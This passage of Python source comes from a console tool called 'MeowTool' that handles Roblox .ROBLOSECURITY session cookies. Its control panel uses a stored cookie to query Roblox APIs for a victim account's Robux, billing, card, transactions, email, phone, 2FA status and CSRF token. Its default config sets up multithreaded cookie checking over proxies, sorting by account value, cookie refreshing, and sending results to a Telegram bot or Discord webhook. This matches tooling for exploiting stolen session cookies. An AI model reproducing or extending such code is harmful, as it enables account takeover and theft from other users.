Verified Age' if config['Roblox']['CookieControlPanel'][category][key][28] == '?' else f'Verified Age: {config['Roblox']['CookieControlPanel'][category][key][28]}'}\n [{ANSI.FG.PINK}29{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Voice' if config['Roblox']['CookieControlPanel'][category][key][29] == '?' else f'Voice: {config['Roblox']['CookieControlPanel'][category][key][29]}'}\n [{ANSI.FG.PINK}30{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Friends' if config['Roblox']['CookieControlPanel'][category][key][30] == '?' else f'Friends: {config['Roblox']['CookieControlPanel'][category][key][30]}'}\n [{ANSI.FG.PINK}31{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Followers' if config['Roblox']['CookieControlPanel'][category][key][31] == '?' else f'Followers: {config['Roblox']['CookieControlPanel'][category][key][31]}'}\n [{ANSI.FG.PINK}32{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Followings' if config['Roblox']['CookieControlPanel'][category][key][32] == '?' else f'Followings: {config['Roblox']['CookieControlPanel'][category][key][32]}'}\n [{ANSI.FG.PINK}33{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} Roblox Badges' if config['Roblox']['CookieControlPanel'][category][key][33] == '?' else f'Roblox Badges: No' if not config['Roblox']['CookieControlPanel'][category][key][33] else f'Roblox Badges: {', '.join(config['Roblox']['CookieControlPanel'][category][key][33])}'}\n [{ANSI.FG.PINK}34{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Find} X-CSRF-Token' if config['Roblox']['CookieControlPanel'][category][key][34] == '?' else f'X-CSRF-Token: {config['Roblox']['CookieControlPanel'][category][key][34]}'}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    cookieControlPanelCookieCurrentCookieDataTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    if cookieControlPanelCookieCurrentCookieDataTab == '0': whileTrueStageCCP2 = False
                    elif cookieControlPanelCookieCurrentCookieDataTab.isdigit() and int(cookieControlPanelCookieCurrentCookieDataTab) <= 35:
                        cookieRoblox = {'.ROBLOSECURITY': config['Roblox']['CookieControlPanel'][category][key][35]}
                        useSSL = True if config['Roblox']['CookieControlPanel']['Use_SSL'] else False

                        async def startCCP(ssl: bool):
                            async with ClientSession(cookies=cookieRoblox) as session:
                                try:
                                    async with session.get('https://users.roblox.com/v1/users/authenticated', ssl=ssl) as response:
                                        if response.status == 401:
                                            return await errorOrCorrectHandler(True, 5, MT_Invalid_Cookie, f'{MT_Cookie_Control_Panel}{ANSI.CLEAR + ANSI.DECOR.BOLD}')

                                    async with session.get('https://www.roblox.com/my/settings/json', ssl=ssl) as response:
                                        isAccountInformation = await response.json()
                                        isID = isAccountInformation['UserId']

                                        getGlobalCheckListGamepasses()
                                        getGlobalCheckListBadges()
                                        getGlobalCheckListCustomGamepasses()
                                        getGlobalCheckListFavoritePlaces()
                                        getGlobalCheckListBundles()

                                        match cookieControlPanelCookieCurrentCookieDataTab.upper():
                                            case '1':  config['Roblox']['CookieControlPanel'][category][key][0]  = list(await isCountryRegistrationFunc(session,                             ssl, True))[2]
                                            case '2':  config['Roblox']['CookieControlPanel'][category][key][1]  = str(isID)
                                            case '3':  config['Roblox']['CookieControlPanel'][category][key][2]  = list(await isNameFunc(                              isAccountInformation,      True))[2]
                                            case '4':  config['Roblox']['CookieControlPanel'][category][key][3]  = list(await isDisplayNameFunc(                       isAccountInformation,      True))[2]
                                            case '5':  _, _, config['Roblox']['CookieControlPanel'][category][key][4], _, _, config['Roblox']['CookieControlPanel'][category][key][5] = list(await isRegistrationDateFunc(session, isID, isAccountInformation, ssl, True))
                                            case '6':  config['Roblox']['CookieControlPanel'][category][key][6]  = list(await isRobuxFunc(              session, isID,                       ssl, True))[2]
                                            case '7':  config['Roblox']['CookieControlPanel'][category][key][7]  = list(await isBillingFunc(            session,                             ssl, True))[2]
                                            case '8':  config['Roblox']['CookieControlPanel'][category][key][8]  = list(await isTransactionsForYearFunc(session, isID,                       ssl, True))[2]
                                            case '9':  config['Roblox']['CookieControlPanel'][category][key][9]  = list(await isTransactionsForYearFunc(session, isID,                       ssl, True))[3]
                                            case '10': config['Roblox']['CookieControlPanel'][category][key][10] = list(await isDonateAllTimeFunc(      session, isID,                       ssl, True))[2]
                                            case '11': config['Roblox']['CookieControlPanel'][category][key][11] = list(await isDonateAllTimeFunc(      session, isID,                       ssl, True))[5]
                                            case '12': config['Roblox']['CookieControlPanel'][category][key][12] = list(await isRapFunc(                session, isID,                       ssl, True))[2]
                                            case '13': config['Roblox']['CookieControlPanel'][category][key][13] = list(await isCardFunc(               session,                             ssl, True))[2]
                                            case '14': config['Roblox']['CookieControlPanel'][category][key][14] = list(await isPremiumFunc(                           isAccountInformation,      True))[2]
                                            case '15': config['Roblox']['CookieControlPanel'][category][key][15] = list(await isGamepassesFunc(         session, isID,                       ssl, True))[2]
                                            case '16': config['Roblox']['CookieControlPanel'][category][key][16] = list(await isBadgesFunc(             session, isID,                       ssl, True))[2]
                                            case '17': config['Roblox']['CookieControlPanel'][category][key][17] = list(await isFavoritePlacesFunc(     session, isID,                       ssl, True))[2]
                                            case '18': config['Roblox']['CookieControlPanel'][category][key][18] = list(await isBundlesFunc(            session, isID,                       ssl, True))[2]
                                            case '19': config['Roblox']['CookieControlPanel'][category][key][19] = list(await isInventoryPrivacyFunc(   session,                             ssl, True))[2]
                                            case '20': config['Roblox']['CookieControlPanel'][category][key][20] = list(await isTradePrivacyFunc(       session,                             ssl, True))[2]
                                            case '21': config['Roblox']['CookieControlPanel'][category][key][21] = list(await isCanTradeFunc(                          isAccountInformation,      True))[2]
                                            case '22': config['Roblox']['CookieControlPanel'][category][key][22] = list(await isSessionsFunc(           session,                             ssl, True))[2]
                                            case '23': config['Roblox']['CookieControlPanel'][category][key][23] = list(await isEmailFunc(                             isAccountInformation,      True))[2]
                                            case '24': config['Roblox']['CookieControlPanel'][category][key][24] = list(await isPhoneFunc(              session,                             ssl, True))[2]
                                            case '25': config['Roblox']['CookieControlPanel'][category][key][25] = list(await is2FAFunc(                               isAccountInformation,      True))[2]
                                            case '26': config['Roblox']['CookieControlPanel'][category][key][26] = list(await isPinFunc(                               isAccountInformation,      True))[2]
                                            case '27': config['Roblox']['CookieControlPanel'][category][key][27] = list(await isAbove13Func(                           isAccountInformation,      True))[2]
                                            case '28': config['Roblox']['CookieControlPanel'][category][key][28] = list(await isVerifiedAgeFunc(        session,                             ssl, True))[2]
                                            case '29': config['Roblox']['CookieControlPanel'][category][key][29] = list(await isVoiceFunc(              session,                             ssl, True))[2]
                                            case '30': config['Roblox']['CookieControlPanel'][category][key][30] = list(await isNumberOfFriendsFunc(    session, isID,                       ssl, True))[2]
                                            case '31': config['Roblox']['CookieControlPanel'][category][key][31] = list(await isNumberOfFollowersFunc(  session, isID,                       ssl, True))[2]
                                            case '32': config['Roblox']['CookieControlPanel'][category][key][32] = list(await isNumberOfFollowingsFunc( session, isID,                       ssl, True))[2]
                                            case '33': config['Roblox']['CookieControlPanel'][category][key][33] = list(await isRobloxBadgesFunc(       session, isID,                       ssl, True))[2]
                                            case '34': config['Roblox']['CookieControlPanel'][category][key][34] = list(await isXCSRFTokenFunc(         session,                             ssl, True))[2]
                                except Exception:
                                    pass

                        await startCCP(useSSL)
                        await autoSaveConfig()

                    await cls()
                    await lableASCII()
            case '2':
                whileTrueStageCCP2 = True
                await cls()
                await lableASCII()
                while whileTrueStageCCP2:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{path}\\{key}\\{MT_Show_Cookie}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n{config['Roblox']['CookieControlPanel'][category][key][35]}\n\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    cookieControlPanelCookieCurrentCookieShowCookie = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    match cookieControlPanelCookieCurrentCookieShowCookie.upper():
                        case '0':
                            whileTrueStageCCP2 = False
                    await cls()
                    await lableASCII()
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStageCCP2 = True
                    await removeLines(9)
                    while whileTrueStageCCP2:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{path}\\{key}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                whileTrueStageCCP1 = False
                                whileTrueStageCCP2 = False
                                try: config['Roblox']['CookieControlPanel'][category].remove(key)
                                except Exception: pass
                                await autoSaveConfig()
                                await removeLines(8)
                            case 'N' | 'Т':
                                whileTrueStageCCP2 = False
                                await removeLines(8)
                            case _:
                                await removeLines(8)
                else:
                    whileTrueStageCCP1 = False
                    try: config['Roblox']['CookieControlPanel'][category].remove(key)
                    except Exception: pass
                    await autoSaveConfig()
            case '0':
                whileTrueStageCCP1 = False
                await removeLines(9)
            case _:
                await removeLines(9)

### Конфиг функции

def validateConfigSettings(userConfig: TOMLDocument, defaultConfig: Table | TOMLDocument, path=''):
    if isinstance(defaultConfig, (Table, TOMLDocument)):
        for key in defaultConfig.keys():
            fullPath = f'{path}.{key}' if path else key

            if key not in userConfig:
                userConfig[key] = defaultConfig[key]
                continue

            currentValue = userConfig[key]
            defaultValue = defaultConfig[key]

            if isinstance(defaultValue, (Table, TOMLDocument)):
                validateConfigSettings(currentValue, defaultValue, fullPath)
            elif isinstance(defaultValue, Item):
                if type(currentValue.unwrap()) is not type(defaultValue.unwrap()):
                    try:
                        commentText = currentValue.comment
                        userConfig[key] = defaultValue
                        if commentText: userConfig[key].comment(commentText)
                    except AttributeError:
                        userConfig[key] = defaultValue

def defaultConfigLoader() -> TOMLDocument:
    configLoader = document()
    configLoader.add(nl())
    configLoader.add(comment('Meow :3'))
    configLoader.add(nl())
    configLoader.add('Loader', table())
    configLoader['Loader']['Load_Config'] = 'default'
    configLoader['Loader']['Load_Config'].comment('name of config for load on launch')
    configLoader['Loader']['Current_Config'] = 'default'
    configLoader.add('Saver', table())
    configLoader['Saver']['Auto_Save_Changes'] = False
    configLoader.add('Updater', table())
    configLoader['Updater']['Check_For_Updates'] = True
    configLoader['Updater']['Save_Old_Versions'] = False
    configLoader.add('MeowTool', table())
    configLoader['MeowTool']['Username'] = ''
    configLoader['MeowTool']['Username'].comment(':3')
    return configLoader

async def loadConfigLoader():
    os.makedirs('Settings\\Configs', exist_ok=True)
    try:
        global configLoader; configLoader = loads(open('Settings\\Configs\\.Loader.toml', 'r', encoding='UTF-8').read())
        validateConfigSettings(configLoader, defaultConfigLoader())

        try:
            configName = str(configLoader['Loader']['Load_Config'])
            configLoader['Loader']['Current_Config'] = configName
            open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
        except Exception:
            configLoader['Loader']['Load_Config'] = 'default'
            open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
            return loadConfig('default')

        await checkUpdates()
        sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Мило просим у конфига настройки... :3{ANSI.CLEAR}\r')

        if configName in configFiles():
            return loadConfig(configName)
        else:
            configLoader['Loader']['Load_Config'] = 'default'
            open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
            return loadConfig('default')
    except Exception:
        configLoader = defaultConfigLoader()
        open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
        await checkUpdates()
        sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK + ANSI.DECOR.BOLD}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Мило просим у конфига настройки... :3{ANSI.CLEAR}\r')        
        return loadConfig('default')

def defaultConfig() -> TOMLDocument:
    config = document()
    config.add(nl())
    config.add(comment('Meow :3'))
    config.add(nl())

    # General
    config.add('General', table())
    config['General']['Console_Title'] = 'MeowTool... Meow :3'
    config['General']['Language'] = 'RU'
    config['General']['Language'].comment('RU or EN')
    config['General']['Show_Lable_MeowTool'] = True
    config['General']['Show_Lable_by_h1kken'] = False
    config['General']['Press_Any_Key_To_Continue'] = True
    config['General']['Disable_Warnings_For_Links'] = False
    config['General']['Disable_Warnings_For_Dangerous_Actions'] = False
    
    # Proxy
    config.add('Proxy', table())
    
    # Proxy - Checker
    config['Proxy'].add('Checker', table())
    config['Proxy']['Checker']['Timeout'] = 5
    config['Proxy']['Checker']['Timeout'].comment('maximum wait for a response from a proxy (in seconds)')
    config['Proxy']['Checker']['Save_In_Custom_Folder'] = False
    config['Proxy']['Checker']['Save_Without_Protocol'] = False

    # Roblox
    config.add('Roblox', table())

    # Roblox - General
    config['Roblox'].add('General', table())
    config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] = False
    config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] = False
    
    # Roblox - General - Outputs
    config['Roblox']['General'].add('Outputs', table())
    config['Roblox']['General']['Outputs']['Telegram_Bot_Token'] = ''
    config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID'] = ''
    config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] = False
    config['Roblox']['General']['Outputs']['Discord_Webhook_URL'] = ''
    config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] = False

    # Roblox - Cookie Sorter
    config['Roblox'].add('CookieSorter', table())
    config['Roblox']['CookieSorter']['Output_Filename'] = 'output'

    # Roblox - Cookie Checker
    config['Roblox'].add('CookieChecker', table())

    # Roblox - Cookie Checker - General
    config['Roblox']['CookieChecker'].add('General', table())
    config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'] = False
    config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker'] = 10
    config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] = 10
    config['Roblox']['CookieChecker']['General']['Use_SSL'] = False
    config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] = False
    config['Roblox']['CookieChecker']['General']['Output_Filename'] = 'output'
    config['Roblox']['CookieChecker']['General']['Output_Filename'].comment('it doesn\'t matter if \'Name_Output_File_The_Same_As_Input_File\' is enabled')
    config['Roblox']['CookieChecker']['General']['Output_Total'] = True

    # Roblox - Cookie Checker - Sorting
    config['Roblox']['CookieChecker'].add('Sorting', table())
    config['Roblox']['CookieChecker']['Sorting']['Sort'] = False
    config['Roblox']['CookieChecker']['Sorting'].add(comment('Categories'))
    for category in cookieData.listOfCookieData:
        if   category[3] == int: config['Roblox']['CookieChecker']['Sorting'][category[1]] = [False, []]
        elif category[3] == str: config['Roblox']['CookieChecker']['Sorting'][category[1]] = False

    # Roblox - Cookie Checker - Proxy
    config['Roblox']['CookieChecker'].add('Proxy', table())
    config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] = False
    config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'http'
    config['Roblox']['CookieChecker']['Proxy']['Auto_Protocol_If_Not_Specified'].comment('if protocol is not specified - it will be this (available: http, socks4, socks5)')

    # Roblox - Cookie Checker - Main
    config['Roblox']['CookieChecker'].add('Main', table())
    for data in cookieData.listOfCookieData:
        config['Roblox']['CookieChecker']['Main'][data[1]] = False
        match data[1]:
            case 'Donate_All_Time' | 'Rap':
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'] = -1
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'].comment('-1 - All')
            case 'Gamepasses' | 'Badges':
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'] = 'Number'
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'].comment('Options: [ Number | Names ]')
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'] = -1
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'].comment('-1 - All')
            case 'Custom_Gamepasses':
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'] = [
                    ['Fly A Pet Potion',  False],
                    ['Ride-A-Pet Potion', False]
                ]
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages'] = -1
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages'].comment('-1 - All')
            case 'Favorite_Places':
                config['Roblox']['CookieChecker']['Main']['Favorite_Places_Output_Mode'] = 'Number'
                config['Roblox']['CookieChecker']['Main']['Favorite_Places_Output_Mode'].comment('Options: [ Number | Names ]')
                config['Roblox']['CookieChecker']['Main']['Favorite_Places_List'] = [
                    [920587237,  'Adopt Me',         False],
                    [142823291,  'Murder Mystery 2', False],
                    [8737899170, 'Pet Simulator 99', False]
                ]
                config['Roblox']['CookieChecker']['Main']['Favorite_Places_Max_Check_Pages'] = -1
                config['Roblox']['CookieChecker']['Main']['Favorite_Places_Max_Check_Pages'].comment('-1 - All')
            case 'Bundles':
                config['Roblox']['CookieChecker']['Main']['Bundles_Output_Mode'] = 'Number'
                config['Roblox']['CookieChecker']['Main']['Bundles_Output_Mode'].comment('Options: [ Number | Names ]')
                config['Roblox']['CookieChecker']['Main']['Bundles_List'] = [
                    [192, 'Korblox Deathspeaker', False],
                    [201, 'Headless Horseman',    False]
                ]
                config['Roblox']['CookieChecker']['Main']['Bundles_Max_Check_Pages'] = -1
                config['Roblox']['CookieChecker']['Main']['Bundles_Max_Check_Pages'].comment('-1 - All')
            case 'Sessions':
                config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages'] = 1
                config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages'].comment('-1 - All, 1 - Must be good to avoid long wait for this \'https://imgur.com/a/TrBIdCu\'')

    # Roblox - Cookie Checker - Places
    config['Roblox']['CookieChecker'].add('Places', table())
    for place in listOfPlaces:
        config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = False
    
    # Roblox - Cookie Checker - Places - Gamepasses and Badges
    for place in listOfPlaces:
        config['Roblox']['CookieChecker'].add(place.__name__, table())
        if getattr(place, 'Gamepasses', False):
            config['Roblox']['CookieChecker'][place.__name__].add(comment('Gamepasses'))
            for gamepass in place.Gamepasses.listOfGamepasses:
                config['Roblox']['CookieChecker'][place.__name__][gamepass[2]] = False
        if getattr(place, 'Badges', False):
            config['Roblox']['CookieChecker'][place.__name__].add(comment('Badges'))
            for badge in place.Badges.listOfBadges:
                config['Roblox']['CookieChecker'][place.__name__][badge[2]] = False

    # Roblox - Cookie Checker - Custom Places
    config['Roblox']['CookieChecker'].add('CustomPlaces', table())
    config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] = False
    config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'] = []
    config['Roblox']['CookieChecker']['CustomPlaces'].add(comment('Custom Places'))

    # Roblox - Cookie Refresher
    config['Roblox'].add('CookieRefresher', table())

    # Roblox - Cookie Refresher - Single Mode
    config['Roblox']['CookieRefresher'].add('SingleMode', table())
    config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'] = [1]
    config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'].comment('Options: [ 1 | 2 | 3 ] | Examples: [1, 2, 3] or [1, 3] etc.')
    
    # Roblox - Cookie Refresher - Mass Mode
    config['Roblox']['CookieRefresher'].add('MassMode', table())
    config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'] = [1]
    config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'].comment('Options: [ 1 | 2 | 3 ] | Examples: [1, 2, 3] or [1, 3] etc.')
    config['Roblox']['CookieRefresher']['MassMode']['Save_Invalid_Cookies'] = False
    config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] = ''
    
    # Roblox - Transaction Analysis
    config['Roblox'].add('TransactionAnalysis', table())
    
    # Roblox - Transaction Analysis - General
    config['Roblox']['TransactionAnalysis'].add('General', table())
    config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'] = False
    config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker'] = 10
    config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis'] = 10
    config['Roblox']['TransactionAnalysis']['General']['Use_SSL'] = False
    config['Roblox']['TransactionAnalysis']['General']['Save_All_Places_In_One_File'] = True
    config['Roblox']['TransactionAnalysis']['General']['Save_Places_To_Different_Files'] = True
    config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] = True
    config['Roblox']['TransactionAnalysis']['General']['Add_Robux_After_Place_In_File_Names'] = False
    config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'] = 'NoIndent'
    config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'].comment('Options: [ NoIndent | MaxIndent ]')
    
    # Roblox - Transaction Analysis - Proxy
    config['Roblox']['TransactionAnalysis'].add('Proxy', table())
    config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] = False
    config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'http'
    config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'].comment('if protocol is not specified - it will be this (available: http, socks4, socks5)')

    # Roblox - Transaction Analysis - Places
    config['Roblox']['TransactionAnalysis'].add('Places', table())
    config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] = False
    config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'] = []
    config['Roblox']['TransactionAnalysis']['Places'].add(comment('Places'))
    config['Roblox']['TransactionAnalysis']['Places'].add(comment('ID = [ID (int), [Clean_Name (str), Full_Name (str)], Check (bool), Discover_New_Names (bool), Count_Robux_In_Total (bool)]'))
    config['Roblox']['TransactionAnalysis']['Places'].add(comment('ID_Ignore_List = [[Clean_Name (str), Ignore (bool)], ...]'))

    # Roblox - Cookie Control Panel
    config['Roblox'].add('CookieControlPanel', table())
    config['Roblox']['CookieControlPanel']['Use_SSL'] = False
    config['Roblox']['CookieControlPanel']['Save_Cookies_Added_Manually'] = False
    config['Roblox']['CookieControlPanel']['Save_Cookies_Checked_By_Checker'] = False
    
    # Roblox - Cookie Control Panel - Cookie Control Panel History
    config['Roblox']['CookieControlPanel'].add('CookieControlPanelHistory', table())
    
    # Roblox - Cookie Control Panel - Roblox Cookie Checker History
    config['Roblox']['CookieControlPanel'].add('RobloxCookieCheckerHistory', table())
    
    # Roblox - Misc
    config['Roblox'].add('Misc', table())
    
    # Roblox - Misc - Gamepasses Parser
    config['Roblox']['Misc'].add('GamepassesParser', table())
    config['Roblox']['Misc']['GamepassesParser']['Remove_Emojies_From_Name'] = False
    config['Roblox']['Misc']['GamepassesParser']['Remove_Round_Brackets_And_In_From_Name'] = False
    config['Roblox']['Misc']['GamepassesParser']['Remove_Square_Brackets_And_In_From_Name'] = False
    
    # Roblox - Misc - Badges Parser
    config['Roblox']['Misc'].add('BadgesParser', table())
    config['Roblox']['Misc']['BadgesParser']['Remove_Emojies_From_Name'] = False
    config['Roblox']['Misc']['BadgesParser']['Remove_Round_Brackets_And_In_From_Name'] = False
    config['Roblox']['Misc']['BadgesParser']['Remove_Square_Brackets_And_In_From_Name'] = False
    return config

def loadConfig(configName: str):
    global config
    os.makedirs('Settings\\Configs', exist_ok=True)
    if not os.path.exists(f'Settings\\Configs\\{configName}.toml'):
        config = defaultConfig()
    else:
        config = loads(open(f'Settings\\Configs\\{configName}.toml', 'r', encoding='UTF-8').read())
        validateConfigSettings(config, defaultConfig())
        
    configLoader['Loader']['Current_Config'] = configName
    open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
    open(f'Settings\\Configs\\{configName}.toml', 'w', encoding='UTF-8').write(dumps(config))

def configFiles() -> list:
    configs = {str(file[:-5]) for file in os.listdir('Settings\\Configs')
               if len(file) <= 65 and file.lower() not in ('.loader.toml', '.toml') and file.lower().endswith('.toml')}
    if not configs:
        loadConfig('default')
        configs.add('default')
    return list(configs)

def printConfigs(configs):
    for index, config in enumerate(configs):
        sys.stdout.write(f' {ANSI.CLEAR + ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(configs))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if configLoader['Loader']['Current_Config'] == config else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {config}\n')

async def configContextMenu(indexConfig: int):
    whileTrueStage3 = True
    choosedConfig = configFiles()[indexConfig]
    listOfExistsConfigs = {str(file).lower() for file in configFiles()}
    await cls()
    await lableASCII()
    while whileTrueStage3:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Configs}\\{choosedConfig}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if configLoader['Loader']['Load_Config'] == choosedConfig else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Load_On_Launch}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Save[0]}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Load}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Rename}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_File_Location}\n  ┃\n [{ANSI.FG.YELLOW}R{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Reset_To_Default_Settings}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
        configTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match configTab.upper():
            case '1':
                if configLoader['Loader']['Load_Config'] != choosedConfig:
                    configLoader['Loader']['Load_Config'] = choosedConfig
                else:
                    configLoader['Loader']['Load_Config'] = 'default'
                open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
                await removeLines(13)
            case '2':
                open(f'Settings\\Configs\\{configLoader['Loader']['Current_Config']}.toml', 'w', encoding='UTF-8').write(dumps(config))
                await removeLines(13)
            case '3':
                loadConfig(choosedConfig)
                await removeLines(13)
            case '4':
                await removeLines(11)
                newNameOfConfig = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_New_Name_For_Config}:{ANSI.CLEAR} ')
                if newNameOfConfig == '0': return await removeLines(5)
                if len(newNameOfConfig) > 100:
                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Config_Name_50, f'{MT_Settings}\\{MT_Configs}\\{choosedConfig}')
                if any(char in newNameOfConfig for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']) or not newNameOfConfig.strip():
                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,                f'{MT_Settings}\\{MT_Configs}\\{choosedConfig}')
